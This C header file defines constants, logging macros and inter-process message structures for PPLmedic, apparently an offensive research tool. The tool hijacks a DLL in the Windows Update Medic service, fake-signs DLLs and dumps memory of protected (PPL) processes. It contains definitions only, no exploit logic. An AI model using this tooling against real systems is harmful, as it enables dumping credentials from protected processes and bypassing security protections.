#pragma once

#include <Windows.h>

#define LOG_LEVEL_NONE                          0
#define LOG_LEVEL_ERROR                         1
#define LOG_LEVEL_WARNING                       2
#define LOG_LEVEL_INFO                          3
#define LOG_LEVEL_DEBUG                         4

#define LOG_LEVEL                               LOG_LEVEL_INFO                          // Log level to use inside the main executable
#define LOG_LEVEL_DLL                           LOG_LEVEL_DEBUG                         // Log level to use inside the DLL (DEBUG or NONE)

#define VERSION_MAJOR                           0                                       // Major version of the tool
#define VERSION_MINOR                           1                                       // Minor version of the tool
#define PAGE_SIZE                               0x1000                                  // Default size for memory allocations
#define LARGE_BUFFER_SIZE                       (256 * 1024 * 1024)                     // Default size for large memory allocations
#define TIMEOUT                                 5000                                    // Default timeout for wait operations
#define MAX_ATTEMPTS                            1000                                    // Default maximum number of attempts for the memory write exploit

#define STR_PPLMEDIC_CMD_DUMP                   L"dump"                                 // Command for dumping a protected process' memory
#define STR_PPLMEDIC_CMD_RESTORE                L"restore"                              // Command for restoring the registry keys in case of previous crash
#define STR_PPLMEDIC_OPT_ELEVATE                L"-p"                                   // Option for elevating from PPL-Windows to PPL-WinTcb

#define STR_KNOWNDLLS                           L"\\KnownDlls"                          // Path of the \KnownDlls object directory
#define STR_MOD_NTDLL                           L"ntdll"                                // Name of the 'ntdll.dll' module
#define STR_MOD_COMBASE                         L"combase"                              // Name of the 'combase.dll' module
#define STR_PROC_NTIMPERSONATETHREAD            "NtImpersonateThread"                   // Syscall for impersonating a thread's Token
#define STR_PROC_NTCREATESECTION                "NtCreateSection"                       // Syscall for creating a Section object
#define STR_PROC_LDRGETKNOWNDLLSECTIONHANDLE    "LdrGetKnownDllSectionHandle"           // Name of the global variable (in 'ntdll') that holds the value of the \KnownDlls directory
#define STR_TI_SVC                              L"TrustedInstaller"                     // Name of the TrustedInstaller identity
#define STR_WAASMEDIC_SVC                       L"WaaSMedicSvc"                         // Name of the Windows Update Medic service
#define STR_WAASMEDIC_CAPSULE                   L"WaaSMedicCapsule.dll"                 // Name of the Windows Update Medic service's capsule plugin module
#define STR_WAASMEDIC_TYPELIB                   L"WaaSMedicPS.dll"                      // Name of the Windows Update Medic service's Proxy/Stub module
#define STR_WAASMEDIC_TYPELIB_DEFAULT           L"%SystemRoot%\\system32\\WaaSMedicPS.dll" // Default path of the Windows Update Medic service's Proxy/Stub module
#define STR_TASKSCHD_TYPELIB_DEFAULT            L"TaskSchdPS.dll"                       // Name of the Task Scheduler's Proxy/Stub module
#define STR_METHOD_LAUNCHDETECTIONONLY          L"LaunchDetectionOnly"                  // Name of the WaaSRemediationAgent's fist method
#define STR_METHOD_LAUNCHREMEDIATIONONLY        L"LaunchRemediationOnly"                // Name of the WaaSRemediationAgent's second method
#define STR_BASENAMEDOBJECTS                    L"BaseNamedObjects"                     // Name of the \BaseNamedObjets object directory
#define STR_HIJACKED_DLL_NAME                   L"WaaSMedicPayload.dll"                 // Name of a non-existent module
#define STR_IPC_WAASMEDIC_LOAD_EVENT_NAME       L"WaaSMedicLoadEvent"                   // Name of an event used for synchronization between the tool and DLL injected in WaaSMedicSvc
#define STR_IPC_WERFAULT_LOAD_EVENT_NAME        L"WerFaultLoaddEvent"                   // Name of an event used for synchronization between the tool and DLL injected in WerFaultSecure.exe
#define STR_IPC_PIPE_NAME                       L"PPLmedicPipe"                         // Name of the named pipe used to communicate with processes in which the payload DLL is injected
#define STR_DUMMY_PIPE_NAME                     L"WaaSMedicLogonSessionPipe"            // Name of the named pipe used to retrieve the initial logon session token of LOCAL SYSTEM
#define STR_SIGNED_SYSTEM_DLL                   L"dbghelp.dll"                          // Name of a legitimate system DLL used to create a fake cached signed DLL
#define STR_CACHE_SIGNED_DLL_NAME               L"faultrep.dll"                         // Name of a DLL to cache sign and hijack in a protected process
#define STR_SIGNED_EXE_NAME                     L"WerFaultSecure.exe"                   // Name of a signed executable we can start with the protection level WinTcb

#define STR_PROTECTION_LEVEL_WINTCB_LIGHT       L"PsProtectedSignerWinTcb-Light"        // PPL WinTcb
#define STR_PROTECTION_LEVEL_WINDOWS            L"PsProtectedSignerWindows"             // PP  Windows
#define STR_PROTECTION_LEVEL_WINDOWS_LIGHT      L"PsProtectedSignerWindows-Light"       // PPL Windows
#define STR_PROTECTION_LEVEL_ANTIMALWARE_LIGHT  L"PsProtectedSignerAntimalware-Light"   // PPL Antimalware
#define STR_PROTECTION_LEVEL_LSA_LIGHT          L"PsProtectedSignerLsa-Light"           // PPL Lsa
#define STR_PROTECTION_LEVEL_WINTCB             L"PsProtectedSignerWinTcb"              // PP  WinTcb
#define STR_PROTECTION_LEVEL_CODEGEN_LIGHT      L"PsProtectedSignerCodegen-Light"       // PPL Codegen
#define STR_PROTECTION_LEVEL_AUTHENTICODE       L"PsProtectedSignerAuthenticode"        // PP  Authenticode
#define STR_PROTECTION_LEVEL_PPL_APP            L"PsProtectedSignerApp-Light"           // PPL App
#define STR_PROTECTION_LEVEL_NONE               L"None"                                 // None

#define STR_SE_SIGNING_LEVEL_UNCHECKED          L"Unchecked"                            // 0x00000000
#define STR_SE_SIGNING_LEVEL_UNSIGNED           L"Unsigned"                             // 0x00000001
#define STR_SE_SIGNING_LEVEL_ENTERPRISE         L"Enterprise"                           // 0x00000002
#define STR_SE_SIGNING_LEVEL_DEVELOPER          L"Developer"                            // 0x00000003 (Custom1)
#define STR_SE_SIGNING_LEVEL_AUTHENTICODE       L"Authenticode"                         // 0x00000004
#define STR_SE_SIGNING_LEVEL_CUSTOM_2           L"Custom2"                              // 0x00000005
#define STR_SE_SIGNING_LEVEL_STORE              L"Store"                                // 0x00000006
#define STR_SE_SIGNING_LEVEL_ANTIMALWARE        L"Antimalware"                          // 0x00000007 (Custom3)
#define STR_SE_SIGNING_LEVEL_MICROSOFT          L"Microsoft"                            // 0x00000008
#define STR_SE_SIGNING_LEVEL_CUSTOM_4           L"Custom4"                              // 0x00000009
#define STR_SE_SIGNING_LEVEL_CUSTOM_5           L"Custom5"                              // 0x0000000A
#define STR_SE_SIGNING_LEVEL_DYNAMIC_CODEGEN    L"DynamicCodegen"                       // 0x0000000B
#define STR_SE_SIGNING_LEVEL_WINDOWS            L"Windows"                              // 0x0000000C
#define STR_SE_SIGNING_LEVEL_CUSTOM_7           L"Custom7"                              // 0x0000000D
#define STR_SE_SIGNING_LEVEL_WINDOWS_TCB        L"WindowsTcb"                           // 0x0000000E
#define STR_SE_SIGNING_LEVEL_CUSTOM_6           L"Custom6"                              // 0x0000000F
#define STR_SE_SIGNING_LEVEL_UNKNOWN            L"Unknown"

#define WIDEH(x) L##x
#define WIDE(x) WIDEH(x)

#if LOG_LEVEL >= LOG_LEVEL_ERROR
#define SUCCESS_FORMAT(f) "[+] " f "\r\n"
#define SUCCESS( format, ... ) wprintf( WIDE(SUCCESS_FORMAT(format)), __VA_ARGS__ )
#ifdef ERROR
#undef ERROR
#endif // ERROR
#define ERROR_FORMAT(f) "[-] " f "\r\n"
#define ERROR( format, ... ) wprintf( WIDE(ERROR_FORMAT(format)), __VA_ARGS__ )
#else
#define SUCCESS( format, ... ) 
#define ERROR( format, ... ) 
#endif // LOG_LEVEL

#if LOG_LEVEL >= LOG_LEVEL_WARNING
#define WARNING_FORMAT(f) "[!] " f "\r\n"
#define WARNING( format, ... ) wprintf( WIDE(WARNING_FORMAT(format)), __VA_ARGS__ )
#else
#define WARNING( format, ... ) 
#endif

#if LOG_LEVEL >= LOG_LEVEL_INFO
#define INFO_FORMAT(f) "[*] " f "\r\n"
#define INFO( format, ... ) wprintf( WIDE(INFO_FORMAT(format)), __VA_ARGS__ )
#else
#define INFO( format, ... ) 
#endif // LOG_LEVEL

#ifdef _WINDLL
#if LOG_LEVEL_DLL >= LOG_LEVEL_DEBUG
#define DEBUG_FORMAT(f) "[PPLmedic] %ws | " f "\r\n"
#define DEBUG( format, ... ) PrintDebug( WIDE(DEBUG_FORMAT(format)), WIDE(__FUNCTION__), __VA_ARGS__ )
#else
#define DEBUG( format, ... ) 
#endif // LOG_LEVEL_DLL
#else
#if LOG_LEVEL >= LOG_LEVEL_DEBUG
#define DEBUG_FORMAT(f) "DEBUG: %ws | " f "\r\n"
#define DEBUG( format, ... ) wprintf( WIDE(DEBUG_FORMAT(format)), WIDE(__FUNCTION__), __VA_ARGS__ )
#else
#define DEBUG( format, ... ) 
#endif // LOG_LEVEL
#endif // _WINDLL

#define EXIT_ON_ERROR(c) if (c) { goto cleanup; }
#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)
#define LAST_ERROR(b) b ? ERROR_SUCCESS : GetLastError()

// https://github.com/antonioCoco/MalSeclogon/blob/master/ntdef.h
#define OBJECT_TYPES_FIRST_ENTRY(ObjectTypes) (POBJECT_TYPE_INFORMATION) RtlOffsetToPointer(ObjectTypes, ALIGN_UP(sizeof(OBJECT_TYPES_INFORMATION), ULONG_PTR))
#define OBJECT_TYPES_NEXT_ENTRY(ObjectType) (POBJECT_TYPE_INFORMATION) RtlOffsetToPointer(ObjectType, sizeof(OBJECT_TYPE_INFORMATION) + ALIGN_UP(ObjectType->TypeName.MaximumLength, ULONG_PTR))

enum class Command
{
    Undefined,
    ProcessDump,
    Restore
};

//
// BEGIN Inter-Process Communication
//

enum class MessageType
{
    DoGetProtectionLevel = 1,
    DoDumpProcess,
    DoFakeSignDll
};

typedef struct _MSG_REQUEST_FAKE_SIGN_DLL
{
    WCHAR InputFilePath[MAX_PATH + 1];
    WCHAR OutputFilePath[MAX_PATH + 1];

} MSG_REQUEST_FAKE_SIGN_DLL, * PMSG_REQUEST_FAKE_SIGN_DLL;

typedef struct _MSG_REQUEST_DUMP_PROCESS
{
    DWORD Pid;
    WCHAR OutputFilePath[MAX_PATH + 1];

} MSG_REQUEST_DUMP_PROCESS, * PMSG_REQUEST_DUMP_PROCESS;

typedef struct _MSG_REQUEST
{
    MessageType Type;
    union {
        MSG_REQUEST_DUMP_PROCESS DumpProcess;
        MSG_REQUEST_FAKE_SIGN_DLL FakeSignDll;
    } p;

} MSG_REQUEST, * PMSG_REQUEST;

static_assert (sizeof(MSG_REQUEST) < PAGE_SIZE, "Structure is too large");

typedef struct _MSG_RESPONSE_PROTECTION_LEVEL
{
    DWORD Level;

} MSG_RESPONSE_PROTECTION_LEVEL, * PMSG_RESPONSE_PROTECTION_LEVEL;

typedef struct _MSG_RESPONSE_FAKE_SIGN_DLL
{
    DWORD Level;

} MSG_RESPONSE_FAKE_SIGN_DLL, * PMSG_RESPONSE_FAKE_SIGN_DLL;

typedef struct _MSG_RESPONSE
{
    MessageType Type;
    BOOL Result;
    DWORD LastError;
    union {
        MSG_RESPONSE_PROTECTION_LEVEL SigningLevel;
        MSG_RESPONSE_FAKE_SIGN_DLL ProtectionLevel;
    } p;
    WCHAR Message[512];

} MSG_RESPONSE, * PMSG_RESPONSE;

static_assert (sizeof(MSG_RESPONSE) < PAGE_SIZE, "Structure is too large");

//
// END Inter-Process Communication
//